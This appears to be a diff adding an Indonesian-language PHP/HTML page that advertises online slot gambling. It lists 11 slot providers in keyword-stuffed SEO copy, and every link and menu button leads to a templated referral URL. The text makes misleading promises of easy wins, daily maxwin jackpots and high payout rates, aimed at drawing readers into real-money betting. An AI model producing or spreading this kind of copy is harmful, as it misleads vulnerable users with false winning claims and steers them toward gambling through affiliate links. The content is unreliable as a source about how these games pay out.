+                 <p style="text-align: justify;"><strong><a title="slot demo" href="<?php echo $REFFERAL1 ?>">Slot demo</a></strong> adalah cara tepat memainkan&nbsp;permainan slot terpopuler tanpa modal saat ini, link demo slot terpopuler tanpa listing berasal dari Badan Demo Pragmatic Game Indonesia. Slot Demo Gratis Tanpa Deposit Pragmatic Play bahkan menawarkan beberapa permainan slot demo nyata untuk para pemain. Sebenarnya untuk mendapatkan akun slot demo gratis sangatlah mudah dengan situs game slot terpercaya di Indonesia. Tentunya mendapatkan akun slot demo gratis tanpa registrasi hanya ditawarkan oleh situs slot online terpercaya di Indonesia seperti Agen Pragmatic Gaming. Pragmatic Gaming Demo Indonesia benar-benar hadir sebagai salah satu penyedia layanan terkemuka untuk memainkan permainan kasino gratis tanpa daftar&nbsp; saat ini. Manfaat bermain slot demo&nbsp; gratis bagi pemain&nbsp; tidak&nbsp; diragukan lagi.</p>
+                 <p style="text-align: justify;">Pasalnya dengan bermain <strong><a title="slot demo gacor \" href="<?php echo $REFFERAL1 ?>">slot demo gacor</a></strong>&nbsp;perjudian yang menawarkan demo, ada beberapa hal yang perlu diketahui&nbsp; pemain terlebih dahulu. Misalnya saja cara membuat akun demo slot dan apa saja link slot demo gratis terpercaya di Indonesia. Dengan begitu Slotmania tidak perlu lagi bersusah payah mencari cara membuat akun slot online untuk memainkan game slot uang asli rupee.</p>
+                 <h2 style="text-align: center;"><span style="color: #666699;">11 Situs Judi Slot Online Terpercaya Yang Ada Situs Slot Demo Pragmatic Tanpa Deposit</span></h2>
+                 <p style="text-align: justify;">Situs <strong><a title="slot demo x500" href="<?php echo $REFFERAL1 ?>">slot demo x500</a></strong>&nbsp;tanpa deposit menawarkan pemain tawaran sederhana dan nyaman untuk bermain mesin slot tanpa modal. Namun, mendapatkan akun demo&nbsp; gratis tanpa deposit&nbsp; tidaklah mudah. Karena tidak semua situs permainan judi&nbsp; online terpercaya di Indonesia menawarkan layanan pendaftaran akun judi demo gratis. Sedangkan akun demo slot deposit gratis&nbsp; ini sangat membantu pemain memahami cara kerja&nbsp; slot yang ingin mereka mainkan. Saat Anda memainkan slot gratis, Slotmania memberikan kesempatan untuk mengetahui&nbsp; slot mana yang harus mereka mainkan hari ini. Ya, karena tidak semua situs judi terpercaya di Indonesia menawarkan akun demo judi. Jangan khawatir, karena masih ada daftar situs permainan kasino online tepercaya yang menawarkan akun demo perjudian gratis dan tidak perlu registrasi. Sebagai salah satu situs judi online terpercaya di Indonesia,&nbsp; dengan senang hati kami bagikan daftar 11<strong> <a title="slot demo mirip asli" href="<?php echo $REFFERAL1 ?>">slot demo mirip asli</a>&nbsp;</strong>dengan akun judi demo real berikut ini:&nbsp;</p>
+                 <h3 style="text-align: justify;"><span style="color: #666699;">1. Slot Demo Pragmatic Play</span></h3>
+                 <p style="text-align: justify;">Pragmatic Play dikenal sebagai provider slot online ternama dan paling top di dunia saat ini. Slot online pragmatic play selalu memberikan kejutan besar kepada penggemar game slot uang asli di Indonesia. Hadirnya pragmatic play demo sebagai inovasi terbaru agar slotmania bisa merasakan keseruan main slot gratis tanpa deposit mirip asli. Demo slot pragmatic play semakin unggul karena fitur menarik serta kemudahan bagi pemain yang ingin memiliki akun slot demo gratis. Free slot demo pragmatic menjadi link slot online gratis yang memungkinkan slotter untuk merasakan serunya main slot tanpa modal.</p>
+                 <h3 style="text-align: justify;"><span style="color: #666699;">2. Slot Demo PG Soft (Pocket Gaming)</span></h3>
+                 <p style="text-align: justify;">PG Soft atau Pocket Gaming merupakan salah satu link slot demo yang bisa kalian temukan dengan mudah. Demo slot pg soft selalu menawarkan keunggulan dan kemudahan bermain game slot online uang asli. Slot demo pg soft sendiri begitu fenomenal dan populer karena popularitas beberapa permainan slot gratis yang mereka hadirkan. Salah satu game slot gacor pg soft adalah mahjong ways, double fortune, caishens wins, dan lucky neko. Demo slot mahjong menjadi game slot paling top dari provider slot online pgsoft yang pantang dilewatkan. Bisa dipastikan slot demo mahjong pgsoft ini sebagai pesaing slot gratis mirip asli paling top saat ini.</p>
+                 <h3 style="text-align: justify;"><span style="color: #666699;">3. Slot Demo Habanero</span></h3>
+                 <p style="text-align: justify;">Habanero slot demo gratis mirip asli selanjutnya yang sudah dikenal sejak pertama kali game slot online dikenal luas. Demo slot habanero memang begitu fenomenal karena menawarkan game slot uang asli yang mudah menang. Slot demo habanero bahkan benar-benar memanjakan para penggemar mereka dengan hadiah jackpot slot maxwin terbesar setiap hari. Demo slot gratis dari provide habanero juga menjadi satu-satunya game slot online uang asli rupiah yang paling sering membagikan jackpot slot terbesar.</p>
+                 <h3 style="text-align: justify;"><span style="color: #666699;">4. Slot Demo Joker123 (Joker Gaming)</span></h3>
+                 <p style="text-align: justify;">Joker123 situs judi slot online terpercaya di Indonesia yang berani memberikan keuntungan tanpa batas kepada pemain. Demo slot joker gaming begitu terkenal karena popularitasnya dalam merilis game slot gampang menang. Slot demo jokergaming juga begitu disukai pemain karena slot demo berhadiah jackpot megawin yang bisa dimenangkan setiap hari. Bahkan link slot online gratis selalu memberikan akun demo slot joker123 tanpa daftar dan peraturan apapun. Permainan game slot tembak ikan gratis menjadi salah satu permainan terbaik yang bisa dimainkan melalui akun slot demo joker123.</p>
+                 <h3 style="text-align: justify;"><span style="color: #666699;">5. Slot Demo Spadegaming (Spade Gaming)</span></h3>
+                 <p style="text-align: justify;">Spadegaming situs slot online terpercaya yang sudah berhasil mendapatkan berbagai penghargaan dari industri casino online internasional. Salah satunya adalah sertifikat resmi Gaming Laboratories Internasional sebagai pengembang game slot gacor paling top. Demo slot spade gaming begitu menarik karena selalu memberikan kepuasan kepada para slotter yang ingin main slot gratis tanpa deposit. Slot demo spade gaming juga begitu rajin dalam merilis permainan slot inovasi terbaru yang sangat berbeda untuk pemain.</p>
+                 <h3 style="text-align: justify;"><span style="color: #666699;">6. Slot Demo CQ9 Gaming</span></h3>
+                 <p style="text-align: justify;">CQ9 Gaming situs judi slot terpercaya di Indonesia bahkan asia yang sangat rajin merilis game slot online uang asli. Bisa dikatakan provider slot online cq9 ini sebagai yang paling sering memberikan update game slot demo gratis terbaru. Demo slot cq9 gaming memiliki keunggulan dalam hal tampilan permainan game slot gratis mirip asli yang mereka suguhkan. Bahkan slot demo cq9 tidak pernah kekurangan peminat meski banyaknya provider slot paling top yang mulai dikenal.</p>
+                 <h3 style="text-align: justify;"><span style="color: #666699;">7. Slot Demo Microgaming</span></h3>
+                 <p style="text-align: justify;">Microgaming link slot online gratis yang cukup tertinggal dalam penyediaan game <strong><a title="slot demo anti rungkad" href="<?php echo $REFFERAL1 ?>">slot demo anti rungkad</a>&nbsp;</strong>tanpa perlu melakukan deposit terlebih dahulu pada saat akan memulai bermain game slot demo terbaru. Meski demikian demo slot microgaming ini begitu dinantikan oleh para penjudi. Hal ini terlihat dari besarnya gempuran para penggemar game slot online yang langsung menyerbu akun slot demo microgaming begitu diperkenalkan. Game slot yang unik menjadi ciri khas dari slot microgaming yang tidak dimiliki oleh provider judi slot online lainnya.</p>
+                 <h3 style="text-align: justify;"><span style="color: #666699;">8. Slot Demo Playtech</span></h3>
+                 <p style="text-align: justify;">Situs slot yang bisa main demo ini sangat memanjakan pemain lewat game slot terbaru setiap hari. Dimana demo slot playtech sangat rajin dalam memperkenalkan game slot gacor hari ini kepada pemain. Meskipun kalah besar dalam popularitas dari provider diatas, Slot demo playtech nyatanya begitu menarik karena memiliki rasio nilai rtp live tertinggi. Slot demo gratis rtp tertinggi tentu memberikan peluang menang slot demo berhadiah jackpot maxwin secara penuh setiap hari.</p>
+                 <h3 style="text-align: justify;"><span style="color: #666699;">9. Slot Demo YggDrasil</span></h3>
+                 <p style="text-align: justify;">Game slot online gratis yang dari provider slot yggdrasil memang tertinggal jauh karena baru diperkenalkan dalam beberapa waktu belakangan ini. Meski terlambat dalam menghadirkan layanan main demo slot gratis, Nyatanya provider slot online ini tidak mau mengecewakan pemain. Hal ini terlihat dari rtp live slot demo tertinggi hari ini yang mereka sediakan untuk pemain. Hampir semua game slot gratis rtp tertinggi dari provider judi slot online yggdrasil mencapai lebih dari 96%.</p>
+                 <h3 style="text-align: justify;"><span style="color: #666699;">10. Slot Demo Top Trend Gaming</span></h3>
+                 <p style="text-align: justify;">Link slot demo paling top selanjutnya hadir dari provider game slot Top Trend Gaming.slot demo mahjong&nbsp;begitu banyak penggemar sehingga mereka selalu berusaha merilis game slot terbaru. Slot demo top trend gaming yang begitu memprioritaskan kenyamanan slotter menjadikan situs slot terpercaya ini selalu disukai oleh para pemula. Bahkan slot demo gratis yang mereka hadirkan selalu mendapatkan penggemar yang begitu besar jumlahnya.</p>
+                 <h3 style="text-align: justify;"><span style="color: #666699;">11. Slot Demo AdvantPlay</span></h3>
+                 <p style="text-align: justify;">Situs<strong> <a title="slot" href="<?php echo $REFFERAL1 ?>">slot</a></strong>&nbsp;online yang ada akun demo nya ini mungkin belum memiliki nama sebesar slot demo<strong>&nbsp;</strong>play. Namun demikian demo slot advantplay sangat menarik karena memberikan pilihan volatilitas dalam beberapa tingkatan. Slotmania bisa bermain slot demo advantplay ini dengan tiga pilihan game slot volatilitas tinggi, sedang dan kecil. Dengan demikian para penggemar game slot online uang asli rupiah bisa tertantang sesuai dengan level yang sudah mereka capai.</p>
+                 <h2 style="text-align: center;">&nbsp;</h2>
+                 <!--BATAS-->
+        </article>
+        <footer>            
+            <div class="container">
+                <div class="footer-text">
+                    <p>&copy; 2023 Slot Demo Pragmatic <a style="color: rgb(7, 80, 236);" href="<?php echo $CANONICAL ?>">Slot Demo</a>. All Rights Reserved.</p>
+                </div>
+            </div>
+        </footer>
+         <div class="sticky-bottom-menu">
+            <a class="menu-items" href="<?php echo $REFFERAL1 ?>" target="_blank" rel="nofollow">
+                <div class="menu-icons"><i class="fas fa-home"></i></div>
+                <div class="menu-text">Home</div>
+            </a>
+            <a class="menu-items" href="<?php echo $REFFERAL1 ?>" target="_blank" rel="nofollow">
+                <div class="menu-icons"><i class="fab fa-android"></i></div>
+                <div class="menu-text">Apps</div>
+            </a>
+            <a class="menu-items menu-login" href="<?php echo $REFFERAL1 ?>" target="_blank" rel="nofollow">
+                <div class="menu-icons"><i class="fas fa-user-alt"></i></div>
+                <div class="menu-text">Daftar</div>
+            </a>
+            <a class="menu-items" href="<?php echo $REFFERAL1 ?>" target="_blank" rel="nofollow">
+                <div class="menu-icons"><i class="fas fa-tags"></i></div>
+                <div class="menu-text">Bonus</div></a>
+            <a class="menu-items" href="<?php echo $REFFERAL1 ?>" target="_blank" rel="nofollow">
+                <div class="menu-icons"><i class="fas fa-comments"></i></div>
+                <div class="menu-text">Livechat</div>
+            </a>
+        </div>
+</body>
+</html>
